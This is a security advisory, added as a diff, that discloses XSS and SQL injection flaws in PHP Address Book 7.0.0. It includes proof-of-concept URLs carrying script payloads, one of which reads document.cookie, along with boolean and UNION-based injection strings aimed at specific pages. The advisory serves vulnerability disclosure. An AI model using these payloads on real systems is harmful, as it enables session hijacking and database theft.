@@ -1,0 +1,51 @@
+##################################################################################
+# Advisory: PHP Address Book 7.0.0 Multiple security vulnerabilities
+# Advisory ID: SSCHADV2012-013
+# Author: Stefan Schurtz
+# Affected Software: Successfully tested on PHP Address Book 7.0.0
+# Vendor URL: http://sourceforge.net/projects/php-addressbook/
+# Vendor Status: informed
+##################################################################################
+
+==========================
+Vulnerability Description
+==========================
+
+PHP Address Book 7.0.0 is prone to multiple XSS and SQLi vulnerabilities
+
+==================
+PoC-Exploit
+==================
+
+// XSS
+
+http://[target]/addressbookv7.0.0/preferences.php?from='"</script><script>alert('xss')</script>
+http://[target]/addressbookv7.0.0/group.php/" /><script> alert('xss')</script>
+http://[target]/addressbookv7.0.0/index.php?group='"</script><script>alert(document.cookie)</script>
+
+// SQLi
+
+http://[target]/addressbookv7.0.0/edit.php?id=1 AND 1=IF(1<2,2,1)
+http://[target]/addressbookv7.0.0/edit.php?id=1 AND 1=IF(1>2,2,1)
+
+// UNION-based Injection, needs 'magic_quotes=off'
+http://[target]/addressbookv7.0.0/view.php?id=1' UNION ALL SELECT NULL, NULL, version(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--+
+
+====================
+Disclosure Timeline
+====================
+
+03-Mar-2012 - vendor informed
+
+========
+Credits
+========
+
+Vulnerabilities found and advisory written by Stefan Schurtz.
+
+===========
+References
+===========
+
+http://sourceforge.net/tracker/?group_id=157964&atid=8059299
+http://www.darksecurity.de/advisories/2012/SSCHADV2012-013.txt
